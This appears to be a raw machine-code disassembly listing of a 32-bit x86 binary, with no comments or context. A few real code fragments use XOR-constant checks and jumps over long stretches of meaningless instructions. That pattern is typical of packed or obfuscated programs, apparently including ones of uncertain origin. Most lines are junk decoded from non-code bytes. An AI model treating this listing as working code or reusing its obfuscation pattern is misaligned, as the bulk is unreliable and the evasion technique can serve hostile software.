  40cb3f:	fs dec eax
  40cb41:	mov    bl,BYTE PTR [esi-0x24ac87f1]
  40cb47:	mov    cl,0xcf
  40cb49:	enter  0xc207,0x81
  40cb4d:	cwde   
  40cb4e:	fimul  WORD PTR [ebx+edx*8+0x4175f354]
  40cb55:	push   cs
  40cb56:	hlt    
  40cb57:	das    
  40cb58:	and    eax,0x13b1d87c
  40cb5d:	add    BYTE PTR [ebp-0x4d],ch
  40cb60:	or     BYTE PTR [ebp*2+0x3b4b6b19],dh
  40cb67:	ins    DWORD PTR es:[edi],dx
  40cb68:	fistp  QWORD PTR [esi-0x7015537c]
  40cb6e:	pop    esi
  40cb6f:	pop    eax
  40cb70:	cmp    DWORD PTR [edi+0x11535dde],ecx
  40cb76:	and    BYTE PTR [esi+0x7fcf21f6],ah
  40cb7c:	test   eax,0x60681603
  40cb81:	(bad)  
  40cb82:	sub    eax,0x4478a8d9
  40cb87:	bound  ebx,QWORD PTR [edi-0x3273b1ff]
  40cb8d:	cmc    
  40cb8e:	test   al,0x33
  40cb90:	(bad)  
  40cb91:	xchg   edx,eax
  40cb92:	cmp    al,0x91
  40cb94:	ror    BYTE PTR [eax+0x7da2a39d],0x58
  40cb9b:	adc    eax,0x68f42244
  40cba0:	mov    DWORD PTR [edi+0x60],esp
  40cba3:	jle    0x40cb3d
  40cba5:	and    ebx,ebx
  40cba7:	push   0x40085c61
  40cbac:	dec    edi
  40cbad:	ss sub edi,edx
  40cbb0:	dec    ebp
  40cbb1:	cmp    bh,BYTE PTR ds:0x697b8730
  40cbb7:	dec    edx
  40cbb8:	pop    eax
  40cbb9:	lahf   
  40cbba:	fistp  DWORD PTR [esp+esi*4+0xacfda78]
  40cbc1:	push   eax
  40cbc2:	push   DWORD PTR [ebp-0x30]
  40cbc5:	push   DWORD PTR [ebp+0xc]
  40cbc8:	call   0x410a7f
  40cbcd:	mov    eax,DWORD PTR [ebp-0x4]
  40cbd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40cbd3:	xor    eax,0x7510854
  40cbd8:	add    eax,ebx
  40cbda:	cmp    ecx,eax
  40cbdc:	jne    0x40cbff
  40cbe2:	mov    eax,DWORD PTR [ebp-0x20]
  40cbe5:	inc    edi
  40cbe6:	cmp    edi,eax
  40cbe8:	jb     0x40c413
  40cbee:	jmp    0x40cc0f
  40cbf3:	mov    eax,DWORD PTR [ebp-0x4]
  40cbf6:	xor    eax,esi
  40cbf8:	add    eax,ebx
  40cbfa:	jmp    0x40e33d
  40cbff:	mov    eax,DWORD PTR [ebp-0x2c]
  40cc02:	movzx  eax,WORD PTR [eax+edi*2]
  40cc06:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc09:	mov    eax,DWORD PTR [ecx+eax*4]
  40cc0c:	mov    DWORD PTR [ebp+0xc],eax
  40cc0f:	mov    eax,DWORD PTR [ebp-0x4]
  40cc12:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc15:	xor    eax,0x7510854
  40cc1a:	add    eax,ebx
  40cc1c:	cmp    ecx,eax
  40cc1e:	jne    0x40cf51
  40cc24:	mov    eax,DWORD PTR [ebp-0x4]
  40cc27:	xor    eax,0x7510854
  40cc2c:	jmp    0x40cbf8
  40cc31:	jmp    0x40cf51
  40cc36:	xchg   BYTE PTR [edi-0x6ff40385],dl
  40cc3c:	adc    DWORD PTR [ebp+0x593a5a78],0x7f4d5be6
  40cc46:	and    cl,BYTE PTR [ebx+0x7d7d7e7e]
  40cc4c:	jle    0x40cccc
  40cc4e:	cmp    al,0x78
  40cc50:	inc    esp
  40cc51:	xor    al,0x1
  40cc53:	mov    gs,WORD PTR [edx]
  40cc55:	sbb    ebp,0xa1bb19da
  40cc5b:	jecxz  0x40cc72
  40cc5d:	mov    ebx,0x903b9ba2
  40cc62:	sbb    bl,bh
  40cc64:	push   es
  40cc65:	loop   0x40cc30
  40cc67:	adc    ch,BYTE PTR [ebx+0x78e6549f]
  40cc6d:	inc    edx
  40cc6e:	inc    eax
  40cc6f:	loop   0x40cc95
  40cc71:	xchg   DWORD PTR [ecx+0x39f9d2c4],esi
  40cc77:	mov    bh,al
  40cc79:	int    0x94
  40cc7b:	scas   eax,DWORD PTR es:[edi]
  40cc7c:	lock xchg ebp,eax
  40cc7e:	and    al,0x18
  40cc80:	repnz adc eax,0xe3de4bc0
  40cc86:	daa    
  40cc87:	arpl   si,bp
  40cc89:	jmp    0x40cccd
  40cc8b:	jge    0x40cd05
  40cc8d:	xor    al,0x30
  40cc8f:	or     ebp,edx
  40cc91:	adc    DWORD PTR [edi],0x9cc9dc90
  40cc97:	inc    esi
  40cc98:	(bad)  
  40cc99:	sbb    BYTE PTR [ebx-0x54537fb4],al
  40cc9f:	push   esp
  40cca0:	outs   dx,BYTE PTR ds:[esi]
  40cca1:	jl     0x40ccc6
  40cca3:	inc    ebp
  40cca4:	sub    BYTE PTR [edx+0xc],cl
  40cca7:	and    edx,DWORD PTR [esi-0x47]
  40ccaa:	push   cs
  40ccab:	sbb    BYTE PTR [esi-0x2ce788ee],ch
  40ccb1:	out    dx,eax
  40ccb2:	jb     0x40cd27
  40ccb4:	or     esi,DWORD PTR [edi-0x68e1c547]
  40ccba:	scas   al,BYTE PTR es:[edi]
  40ccbb:	sub    dl,ch
  40ccbd:	(bad)  
  40ccbe:	mov    edi,0x3e486e02
  40ccc3:	stc    
  40ccc4:	push   ss
  40ccc5:	dec    esi
  40ccc6:	sahf   
  40ccc7:	fst    DWORD PTR [edi+0x3955076a]
  40cccd:	sbb    ebx,DWORD PTR [ebp+0x5b]
  40ccd0:	in     eax,0x6a
  40ccd2:	push   ebp
  40ccd3:	(bad)  
  40ccd4:	and    cl,BYTE PTR [esi-0x468d9fa2]
  40ccda:	mov    eax,ds:0x4cdd7516
  40ccdf:	lods   eax,DWORD PTR ds:[esi]
  40cce0:	sti    
  40cce1:	dec    ebx
  40cce2:	scas   eax,DWORD PTR es:[edi]
  40cce3:	mov    BYTE PTR [edi+ebp*4],dh
  40cce6:	cdq    
  40cce7:	hlt    
  40cce8:	scas   al,BYTE PTR es:[edi]
  40cce9:	adc    eax,0x8c6db711
  40ccee:	inc    ebp
  40ccef:	ror    BYTE PTR [ebp-0x33774be4],cl
  40ccf5:	adc    al,0x54
  40ccf7:	outs   dx,DWORD PTR ds:[esi]
  40ccf8:	pop    ebp
  40ccf9:	popf   
  40ccfa:	mov    edi,0xb963b128
  40ccff:	inc    esi
  40cd00:	mov    al,0xa1
  40cd02:	xor    al,0x63
  40cd04:	push   ds
  40cd05:	arpl   WORD PTR [ebp+0x61c5d126],bp
  40cd0b:	inc    edx
  40cd0c:	outs   dx,DWORD PTR ds:[esi]
  40cd0d:	adc    BYTE PTR [eax-0x7c],dh
  40cd10:	in     al,dx
  40cd11:	xor    eax,0xc97113c8
  40cd16:	sbb    eax,0x698dacdd
  40cd1b:	dec    edi
  40cd1c:	and    edi,DWORD PTR [ecx+0x2336134]
  40cd22:	push   ds
  40cd23:	loope  0x40cd4e
  40cd25:	addr16 (bad) 
  40cd27:	ins    BYTE PTR es:[edi],dx
  40cd28:	pop    esp
  40cd29:	mov    esi,0x20fbe879
  40cd2e:	data16 int 0xdb
  40cd31:	push   ebx
  40cd32:	dec    ecx
  40cd33:	pop    ecx
  40cd34:	popa   
  40cd35:	mov    al,ds:0x143ccba
  40cd3a:	pand   mm5,QWORD PTR [ecx]
  40cd3d:	ins    BYTE PTR es:[edi],dx
  40cd3e:	js     0x40cd89
  40cd40:	icebp  
  40cd41:	cdq    
  40cd42:	mov    BYTE PTR [ecx],bl
  40cd44:	hlt    
  40cd45:	push   esp
  40cd46:	pop    es
  40cd47:	paddusw mm0,QWORD PTR [ebx]
  40cd4a:	xor    bh,ah
  40cd4c:	or     al,0x2d
  40cd4e:	outs   dx,DWORD PTR ds:[esi]
  40cd4f:	stos   BYTE PTR es:[edi],al
  40cd50:	add    bl,BYTE PTR [ecx+0x4ce6e5af]
  40cd56:	in     al,dx
  40cd57:	aas    
  40cd58:	inc    edi
  40cd59:	jmp    0x40ccfd
  40cd5b:	add    eax,0xd1884732
  40cd60:	xchg   ebx,eax
  40cd61:	fidiv  WORD PTR [esi]
  40cd63:	add    ebp,DWORD PTR [edi]
  40cd65:	loopne 0x40cce9
  40cd67:	int    0x34
  40cd69:	adc    al,0x7
  40cd6b:	ret    
  40cd6c:	jge    0x40cd70
  40cd6e:	jg     0x40ccf8
  40cd70:	nop
  40cd71:	mov    ah,0xd
  40cd73:	dec    edi
  40cd74:	sub    al,0x99
  40cd76:	and    DWORD PTR [edx],ecx
  40cd78:	aad    0x96
  40cd7a:	dec    ecx
  40cd7b:	inc    edx
  40cd7c:	mov    dl,0xf3
  40cd7e:	xchg   BYTE PTR [edi+0x42e10ce],dl
  40cd84:	xchg   ebp,eax
  40cd85:	add    DWORD PTR [esi],0xffffff83
  40cd88:	(bad)  
  40cd89:	(bad)  
  40cd8b:	sbb    BYTE PTR [edx+edx*2-0x1ce68363],ch
  40cd92:	gs aam 0x20
  40cd95:	mov    dl,BYTE PTR [ecx+0x7e]
  40cd98:	cmc    
  40cd99:	add    DWORD PTR [esi-0x45],ebx
  40cd9c:	add    bl,BYTE PTR [eax]
  40cd9e:	dec    eax
  40cd9f:	jmp    0xb1a91e47
  40cda4:	test   DWORD PTR [ebp+0x60],ecx
  40cda7:	adc    ebx,DWORD PTR [ecx+0xfa4e5fc]
  40cdad:	pop    esp
  40cdae:	ss xchg ebp,eax
  40cdb0:	or     al,0x73
  40cdb2:	(bad)  
  40cdb3:	jge    0x40cdd9
  40cdb5:	jecxz  0x40ce11
  40cdb7:	mov    bl,0x78
  40cdb9:	jns    0x40ce25
  40cdbb:	inc    esp
  40cdbc:	sar    edx,cl
  40cdbe:	test   BYTE PTR ds:0x4ef97f00,0x16
  40cdc5:	scas   al,BYTE PTR es:[edi]
  40cdc6:	jno    0x40cde5
  40cdc8:	push   ebp
  40cdc9:	dec    edx
  40cdca:	stos   DWORD PTR es:[edi],eax
  40cdcb:	xor    BYTE PTR [ebx-0x13b19a94],0x60
  40cdd2:	nop
  40cdd3:	jae    0x40ce19
  40cdd5:	mov    edi,0x75f7a086
  40cdda:	(bad)  
  40cddb:	lea    esp,ss:0xa63ab3a3
  40cde2:	rcr    BYTE PTR [esi+0x27],cl
  40cde5:	outs   dx,BYTE PTR ds:[esi]
  40cde6:	cmp    ax,0x7c7e
  40cdea:	out    dx,al
  40cdeb:	adc    esp,edi
  40cded:	int    0x9b
  40cdef:	out    dx,eax
  40cdf0:	push   es
  40cdf1:	mov    ecx,0xc271aadd
  40cdf6:	rol    ch,0x4b
  40cdf9:	cdq    
  40cdfa:	ficom  WORD PTR [ebx]
  40cdfc:	pop    ecx
  40cdfd:	inc    DWORD PTR [esi-0x4053adcf]
  40ce03:	sahf   
  40ce04:	stos   BYTE PTR es:[edi],al
  40ce05:	sti    
  40ce06:	mov    ebx,0x2693c846
  40ce0b:	inc    esi
  40ce0c:	mov    ss,WORD PTR [edi+eiz*4+0x1f]
  40ce10:	xchg   ebx,eax
  40ce11:	sysenter 
  40ce13:	cmp    eax,0x56e5de80
  40ce18:	push   0x74ee6ff2
  40ce1d:	mov    dl,BYTE PTR [eax-0x34]
  40ce20:	ja     0x40cda6
  40ce22:	inc    esp
  40ce23:	(bad)  
  40ce24:	pop    edi
  40ce25:	add    DWORD PTR [eax-0x6c],esp
  40ce28:	cmc    
  40ce29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce2a:	sub    BYTE PTR [eax-0x667b9208],ch
  40ce30:	cli    
  40ce31:	and    ah,BYTE PTR [ebp+0x28df17e2]
  40ce37:	(bad)  
  40ce38:	fild   QWORD PTR [ebx+0x48]
  40ce3b:	adc    ah,BYTE PTR [eax+0x7b053e7c]
  40ce41:	test   dl,ch
  40ce43:	mov    al,ds:0xc7a9b3cf
  40ce48:	in     al,dx
  40ce49:	mov    ds:0x2dfccfa,eax
  40ce4e:	pop    esi
  40ce4f:	daa    
  40ce50:	out    dx,ax
  40ce52:	jl     0x40ce6b
  40ce54:	add    BYTE PTR [ecx+0x22],dh
  40ce57:	js     0x40ce00
  40ce59:	nop
  40ce5a:	int    0x7c
  40ce5c:	loopne 0x40cde0
  40ce5e:	in     al,0x29
  40ce60:	in     eax,0x75
  40ce62:	dec    ebx
  40ce63:	push   edx
  40ce64:	loopne 0x40ce95
  40ce66:	call   0x95256494
  40ce6b:	inc    edx
  40ce6c:	call   0x2270:0x4f870e44
  40ce73:	add    ch,dl
  40ce75:	sbb    bh,BYTE PTR [esi+0x515368be]
  40ce7b:	push   esp
  40ce7c:	sub    ch,BYTE PTR [ebx-0x20a09a01]
  40ce82:	sub    al,0x86
  40ce84:	xchg   ecx,eax
  40ce85:	cwde   
  40ce86:	arpl   bp,bx
  40ce88:	or     ecx,ebx
  40ce8a:	jne    0x40ce1c
  40ce8c:	addr16 jmp 0x87c487d1
  40ce92:	stos   DWORD PTR es:[edi],eax
  40ce93:	fcmovnbe st,st(0)
  40ce95:	jecxz  0x40cea0
  40ce97:	out    dx,al
  40ce98:	call   0x91ad:0x5ce141af
  40ce9f:	push   0xda421d8b
  40cea4:	shr    DWORD PTR [edi+0x44],cl
  40cea7:	leave  
  40cea8:	or     bl,BYTE PTR [edx]
  40ceaa:	pop    edi
  40ceab:	jo     0x40cf26
  40cead:	mov    eax,ds:0x673579de
  40ceb2:	outs   dx,DWORD PTR ds:[esi]
  40ceb3:	int3   
  40ceb4:	xor    DWORD PTR [ebp-0x1ad845f9],esi
  40ceba:	es mov ebx,0x53b593d1
  40cec0:	addr16 int3 
  40cec2:	push   ebx
  40cec3:	iret   
  40cec4:	cmp    dl,BYTE PTR [ebx]
  40cec6:	imul   edx,edi,0x53
  40cec9:	js     0x40ce86
  40cecb:	sbb    bh,dl
  40cecd:	out    dx,eax
  40cece:	test   al,0x5d
  40ced0:	adc    ah,al
  40ced2:	stc    
  40ced3:	xchg   DWORD PTR [eax+ebp*1],ebx
  40ced6:	sub    DWORD PTR [ebp+0x10],edi
  40ced9:	lock daa 
  40cedb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cedc:	mov    al,ds:0xcaeb3367
  40cee1:	fidiv  DWORD PTR [edx-0x5fa5b741]
  40cee7:	push   esp
  40cee8:	pop    ss
  40cee9:	dec    ebp
  40ceea:	imul   edi,DWORD PTR [ecx-0x7af0baf2],0x1d
  40cef1:	pop    es
  40cef2:	lds    ebp,FWORD PTR [eax]
  40cef4:	cdq    
  40cef5:	inc    DWORD PTR [ebp+0x28]
  40cef8:	sub    al,0x35
  40cefa:	cdq    
  40cefb:	mov    WORD PTR [eax],?
  40cefd:	ja     0x40cf30
  40ceff:	jle    0x40ceee
  40cf01:	or     eax,0x97fb570d
  40cf06:	cmp    BYTE PTR [ebx+eiz*2],0x17
  40cf0a:	cs cmp al,0x45
  40cf0d:	cmovge esp,DWORD PTR [ecx-0x7dce22a8]
  40cf14:	pop    edx
  40cf15:	adc    ecx,DWORD PTR [ebp-0x8]
  40cf18:	inc    ebp
  40cf19:	push   esi
  40cf1a:	clc    
  40cf1b:	rcr    DWORD PTR [ebp-0x42],0x58
  40cf1f:	dec    ebp
  40cf20:	push   ds
  40cf21:	fsubr  DWORD PTR [eax]
  40cf23:	addr16 mov esp,0xaeb5e0c
  40cf29:	(bad)  
  40cf2a:	xchg   esi,eax
  40cf2b:	mov    DWORD PTR ds:0xbd4e4cc1,ebp
  40cf31:	cmp    DWORD PTR ds:0x9c42d417,0x898b1f2
  40cf3b:	jo     0x40cf86
  40cf3d:	hlt    
  40cf3e:	pop    edx
  40cf3f:	mov    dh,0xd6
  40cf41:	jmp    0xec2c61ae
  40cf46:	sbb    edi,DWORD PTR [edi+0x3e]
  40cf49:	sahf   
  40cf4a:	fist   DWORD PTR [ebx-0x40]
  40cf4d:	xchg   ebp,eax
  40cf4e:	sti    
  40cf4f:	dec    esp
  40cf50:	hlt    
  40cf51:	mov    eax,DWORD PTR [ebp+0xc]
  40cf54:	add    eax,DWORD PTR [ebp+0x8]
  40cf57:	mov    DWORD PTR [ebp-0x10],eax
  40cf5a:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf5d:	test   eax,eax
  40cf5f:	je     0x40dfcf
  40cf65:	mov    DWORD PTR [ebp-0x24],esi
  40cf68:	push   0xb
  40cf6a:	pop    ecx
  40cf6b:	push   0x5
  40cf6d:	dec    ecx
  40cf6e:	jmp    0x40d28e
  40cf73:	test   DWORD PTR [ebx],ebx
  40cf75:	jnp    0x40cfa2
  40cf77:	mov    eax,ds:0x98b1b52b
  40cf7c:	xchg   ecx,eax
  40cf7d:	rcr    dl,0xcc
  40cf80:	adc    al,0xac
  40cf82:	jnp    0x40cfa5
  40cf84:	xchg   esi,eax
  40cf85:	jle    0x40d005
  40cf87:	jge    0x40d006
  40cf89:	jle    0x40d009
  40cf8b:	test   al,0x78
  40cf8d:	shl    dl,1
  40cf8f:	outs   dx,BYTE PTR ds:[esi]
  40cf90:	or     BYTE PTR [edi],ch
  40cf92:	mov    al,BYTE PTR [eax-0x274946b0]
  40cf98:	(bad)  
  40cf99:	pop    edi
  40cf9a:	jb     0x40cfb3
  40cf9c:	ja     0x40cf94
  40cf9e:	and    edx,DWORD PTR ds:0x9d4d832d
  40cfa4:	cmp    esp,DWORD PTR [ebp+eiz*2+0x43a5fd43]
  40cfab:	add    esi,DWORD PTR [ebx+ebx*4+0x16]
  40cfaf:	ret    0xd8fb
  40cfb2:	pop    es
  40cfb3:	test   cl,ah
  40cfb5:	dec    edi
  40cfb6:	mov    WORD PTR [ebx+eax*1-0xd340620],?
  40cfbd:	cmp    ebp,DWORD PTR [eax]
  40cfbf:	rol    DWORD PTR [ecx+0x64f90b0],0xb9
  40cfc6:	test   eax,0xc1a631e8
  40cfcb:	lods   eax,DWORD PTR ds:[esi]
  40cfcc:	jns    0x40cfc3
  40cfce:	out    dx,eax
  40cfcf:	mov    ebx,0x9919c963
  40cfd4:	(bad)  
  40cfd5:	and    eax,0x72d21fb2
  40cfda:	push   ebp
  40cfdb:	sbb    BYTE PTR [eax-0xd8d507],ch
  40cfe1:	mov    ds,WORD PTR [ebx-0x2c75d567]
  40cfe7:	rcr    DWORD PTR [esp+ebx*1-0x20],1
  40cfeb:	mov    es,eax
  40cfed:	xor    DWORD PTR [edi+esi*4+0x76],0x7d3fd31a
  40cff5:	scas   eax,DWORD PTR es:[edi]
  40cff6:	dec    esi
  40cff7:	dec    edi
  40cff8:	sub    eax,0x30afcd7b
  40cffd:	cmp    eax,0x7d51495f
  40d002:	in     eax,dx
  40d003:	adc    dl,BYTE PTR [esi-0x4b]
  40d006:	retf   0xfe08
  40d009:	cli    
  40d00a:	push   esp
  40d00b:	sbb    dh,BYTE PTR [ebp+0xbbde903]
  40d011:	and    BYTE PTR [esi],ch
  40d013:	test   BYTE PTR [eax],0x3c
  40d016:	sahf   
  40d017:	mov    eax,ds:0xb8ef1753
  40d01c:	cmp    eax,0xb9bb0e7a
  40d021:	jge    0x40d08c
  40d023:	inc    ecx
  40d024:	mov    edi,0x2e654a6
  40d029:	pop    eax
  40d02a:	mov    ds:0xbc0e7358,al
  40d02f:	inc    ecx
  40d030:	mov    dh,0x2a
  40d032:	ror    DWORD PTR [eax-0x36],1
  40d035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d036:	ins    BYTE PTR es:[edi],dx
  40d037:	hlt    
  40d038:	push   0xffffff97
  40d03a:	punpcklbw mm0,DWORD PTR [edi]
  40d03d:	into   
  40d03e:	pop    ebx
  40d03f:	js     0x40cfe1
  40d041:	clc    
  40d042:	and    DWORD PTR [eax-0x39],ebx
  40d045:	rol    BYTE PTR [ebp+0x2b6b9e98],1
  40d04b:	cli    
  40d04c:	adc    eax,DWORD PTR [esi-0x2815f627]
  40d052:	add    ch,0xc2
  40d055:	cs scas eax,DWORD PTR es:[edi]
  40d057:	mov    eax,0x5407266d
  40d05c:	lods   eax,DWORD PTR ds:[esi]
  40d05d:	jecxz  0x40d0d6
  40d05f:	pop    esp
  40d060:	in     al,0x32
  40d062:	inc    edx
  40d063:	mov    cl,BYTE PTR [ebx]
  40d065:	mov    bh,ah
  40d067:	adc    ebx,edi
  40d069:	int    0x4e
  40d06b:	out    dx,eax
  40d06c:	jbe    0x40d027
  40d06e:	out    0xf0,eax
  40d070:	xor    DWORD PTR [eax-0x10],0xffffffaf
  40d074:	icebp  
  40d075:	dec    ebp
  40d076:	out    0x7f,al
  40d078:	and    edx,DWORD PTR [ebx-0x21d43c6a]
  40d07e:	xor    eax,0x42756458
  40d083:	cwde   
  40d084:	xchg   BYTE PTR [ebp+0x26f50d85],dh
  40d08a:	mov    al,ds:0x5f94c77
  40d08f:	mov    WORD PTR [ebx+0x40],ds
  40d092:	lea    ebp,[esp+ebp*1]
  40d095:	aaa    
  40d096:	jmp    0x40d109
  40d098:	mov    ah,bh
  40d09a:	or     esp,DWORD PTR [edx]
  40d09c:	pop    ds
  40d09d:	sub    al,0x99
  40d09f:	mov    dl,0xce
  40d0a1:	mov    ds:0x9053ebfa,eax
  40d0a6:	je     0x40d0ed
  40d0a8:	ds (bad) 
  40d0aa:	(bad)  
  40d0ac:	pop    es
  40d0ad:	sub    eax,eax
  40d0af:	xor    ch,BYTE PTR [ebx+ecx*2-0x75]
  40d0b3:	cmp    eax,ebx
  40d0b5:	lds    ebx,FWORD PTR [edi+0x26]
  40d0b8:	jp     0x40d03a
  40d0ba:	or     ecx,ebp
  40d0bc:	cwde   
  40d0bd:	xchg   edi,eax
  40d0be:	fs xchg esi,eax
  40d0c0:	dec    edi
  40d0c1:	xchg   ebx,eax
  40d0c2:	loop   0x40d12b
  40d0c4:	push   cs
  40d0c5:	xchg   esp,eax
  40d0c6:	repnz iret 
  40d0c8:	mov    BYTE PTR [edi-0x9],bh
  40d0cb:	or     eax,0xa5bef5cd
  40d0d0:	sbb    al,0xa2
  40d0d2:	test   DWORD PTR [edi-0x5f2a23f3],ebp
  40d0d8:	in     eax,0x51
  40d0da:	into   
  40d0db:	mov    edi,0xc1150bf3
  40d0e0:	sub    eax,0xb5b88ded
  40d0e5:	cs out dx,al
  40d0e7:	fnstcw WORD PTR [ecx+0x3c]
  40d0ea:	mov    eax,0xe0d88893
  40d0ef:	mov    ds:0x483632a1,al
  40d0f5:	ret    
  40d0f6:	or     edx,ebp
  40d0f8:	or     al,0x46
  40d0fa:	(bad)  
  40d0fb:	push   cs
  40d0fc:	adc    eax,0x1e31f77b
  40d101:	xor    al,BYTE PTR ds:0xe2f2f514
  40d107:	xchg   ch,dl
  40d109:	es adc dl,al
  40d10c:	sub    al,0x8e
  40d10e:	mov    DWORD PTR [ebx+0x73],eax
  40d111:	out    0x2a,al
  40d113:	fs out 0xe2,al
  40d116:	jbe    0x40d0c7
  40d118:	xor    bl,BYTE PTR [eax+0x33]
  40d11b:	pop    esi
  40d11c:	aas    
  40d11d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d11e:	fwait
  40d11f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d120:	mov    ebx,0xe0ef9c3e
  40d125:	or     ebp,esp
  40d127:	into   
  40d128:	lods   al,BYTE PTR ds:[esi]
  40d129:	das    
  40d12a:	cli    
  40d12b:	mov    ?,ebx
  40d12d:	std    
  40d12e:	pop    edx
  40d12f:	xchg   ebp,eax
  40d130:	jmp    0x970f:0x881a662
  40d137:	inc    edx
  40d138:	cmp    eax,0x13dbec87
  40d13d:	(bad)  
  40d13e:	out    dx,al
  40d13f:	push   0x5f92e369
  40d144:	mov    esp,0x20680c70
  40d149:	adc    BYTE PTR cs:[edi+0x71],ah
  40d14d:	loopne 0x40d14d
  40d14f:	pop    es
  40d150:	outs   dx,DWORD PTR ds:[esi]
  40d151:	and    DWORD PTR [ebx-0x6f],eax
  40d154:	in     al,dx
  40d155:	cmp    edx,DWORD PTR [esp+eiz*2]
  40d158:	push   esi
  40d159:	vpsubsb xmm3,xmm7,XMMWORD PTR [edx+0x6b699b4a]
  40d161:	mov    ecx,DWORD PTR [esi]
  40d163:	adc    DWORD PTR [ecx+0x6e343f60],esi
  40d169:	adc    BYTE PTR [eax-0xf],cl
  40d16c:	not    DWORD PTR [ebx-0x7d]
  40d16f:	mov    eax,0xad245e8c
  40d174:	push   ebx
  40d175:	call   0xae2980a6
  40d17a:	cmp    DWORD PTR [ebx-0x7064cbf2],ecx
  40d180:	cli    
  40d181:	ret    
  40d182:	fild   QWORD PTR gs:[edx-0x5f3846b0]
  40d189:	mov    DWORD PTR [edi-0x1e733396],eax
  40d18f:	adc    al,0xfc
  40d191:	imul   eax,DWORD PTR [edx+esi*1-0x60],0x8eaa70fb
  40d199:	js     0x40d1aa
  40d19b:	in     al,0x4b
  40d19d:	dec    ebp
  40d19e:	inc    BYTE PTR [esi-0x42752df6]
  40d1a4:	dec    BYTE PTR [edx+0x68ceacfa]
  40d1aa:	cmp    DWORD PTR [ebx+0x1c],esi
  40d1ad:	rcr    ch,cl
  40d1af:	lods   eax,DWORD PTR ds:[esi]
  40d1b0:	ret    0x903d
  40d1b3:	push   es
  40d1b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1b5:	sar    DWORD PTR [edi],cl
  40d1b7:	xor    eax,0x829d77ee
  40d1bc:	xlat   BYTE PTR fs:[ebx]
  40d1be:	inc    ebp
  40d1bf:	(bad)  
  40d1c0:	xchg   esi,eax
  40d1c1:	aad    0xbe
  40d1c3:	mov    edi,0xb1f475f7
  40d1c8:	mov    eax,DWORD PTR [ecx]
  40d1ca:	shr    eax,cl
  40d1cc:	das    
  40d1cd:	dec    ebx
  40d1ce:	repnz test esi,ebx
  40d1d1:	out    dx,al
  40d1d2:	sub    ah,cl
  40d1d4:	fbstp  TBYTE PTR [edx]
  40d1d6:	jmp    0xc461:0x8cde34ab
  40d1dd:	out    dx,eax
  40d1de:	mov    ch,0x1b
  40d1e0:	xor    al,0xf3
  40d1e2:	pop    ecx
  40d1e3:	mov    BYTE PTR [eax],dh
  40d1e5:	popa   
  40d1e6:	and    al,BYTE PTR [edx]
  40d1e8:	sbb    eax,0x4fcda2b
  40d1ed:	out    dx,eax
  40d1ee:	jp     0x40d18f
  40d1f0:	push   ebx
  40d1f1:	xlat   BYTE PTR ds:[ebx]
  40d1f2:	ja     0x40d18f
  40d1f4:	mov    DWORD PTR [edx-0x4232415d],esp
  40d1fa:	xor    esi,DWORD PTR [esi-0x69]
  40d1fd:	adc    al,BYTE PTR [ebp+0x395e8a66]
  40d203:	repnz sbb BYTE PTR [eax-0x70],dl
  40d207:	aaa    
  40d208:	out    0xb6,al
  40d20a:	and    ebx,DWORD PTR [ebp-0x5352f7eb]
  40d210:	(bad)  
  40d211:	popf   
  40d212:	or     ebx,esi
  40d214:	pop    esi
  40d215:	jecxz  0x40d20a
  40d217:	aaa    
  40d218:	dec    esi
  40d219:	and    BYTE PTR [ecx],dh
  40d21b:	xor    BYTE PTR [ebx],dl
  40d21d:	imul   esp,DWORD PTR [ecx+0x53],0x9971f8be
  40d224:	int3   
  40d225:	imul   edx,DWORD PTR [eax-0x22],0xa38e3436
  40d22c:	aas    
  40d22d:	jo     0x40d1e4
  40d22f:	cmp    eax,0x73c1b4fe
  40d234:	js     0x40d284
  40d236:	(bad)  
  40d237:	in     eax,dx
  40d238:	push   ss
  40d239:	fnstenv [ebp-0x1c26d7bc]
  40d23f:	inc    edx
  40d240:	int    0x56
  40d242:	je     0x40d2a3
  40d244:	jg     0x40d287
  40d246:	daa    
  40d247:	sbb    edx,0x21ffda54
  40d24d:	pop    ss
  40d24e:	jp     0x40d2a9
  40d250:	mov    al,ds:0x5ad6c89e
  40d255:	gs pop es
  40d257:	xchg   edx,eax
  40d258:	inc    ecx
  40d259:	cs jne 0x40d230
  40d25c:	clc    
  40d25d:	dec    edx
  40d25e:	xchg   BYTE PTR [ebx],ch
  40d260:	dec    edx
  40d261:	adc    DWORD PTR [esi],0x0
  40d264:	in     al,0xd7
  40d266:	outs   dx,BYTE PTR ds:[esi]
  40d267:	adc    al,0xe9
  40d269:	jmp    0x20e9a258
  40d26e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d26f:	cmp    eax,0x94819263
  40d274:	mov    edx,cs
  40d276:	mov    edi,0xde3c141d
  40d27b:	lds    edx,FWORD PTR [esi]
  40d27d:	fild   QWORD PTR [ebx-0x7d]
  40d280:	pop    esp
  40d281:	jle    0x40d26f
  40d283:	adc    al,0x67
  40d285:	or     al,0x84
  40d287:	leave  
  40d288:	das    
  40d289:	mov    al,ds:0x19649d16
  40d28e:	pop    ebx
  40d28f:	xchg   ebx,ecx
  40d291:	sub    ebx,ecx
  40d293:	xchg   ebx,ecx
  40d295:	dec    ecx
  40d296:	mov    eax,DWORD PTR [ebp-0x1c]
  40d299:	imul   eax,ecx
  40d29c:	sub    esp,eax
  40d29e:	mov    DWORD PTR [ebp-0x24],esp
  40d2a1:	mov    eax,DWORD PTR [ebp-0x4]
  40d2a4:	mov    ecx,0x7510854
  40d2a9:	xor    eax,ecx
  40d2ab:	mov    edx,0x32729b
  40d2b0:	add    eax,edx
  40d2b2:	mov    DWORD PTR [ebp+0x8],eax
  40d2b5:	mov    eax,DWORD PTR [ebp-0x18]
  40d2b8:	xor    eax,ecx
  40d2ba:	add    eax,edx
  40d2bc:	mov    edx,DWORD PTR [ebp+0x14]
  40d2bf:	jmp    0x40d5df
  40d2c4:	xor    ch,cl
  40d2c6:	xor    DWORD PTR [ecx+0x69b241f1],eax
  40d2cc:	xor    esi,ebx
  40d2ce:	pop    ecx
  40d2d0:	mov    ecx,0x2c13caf0
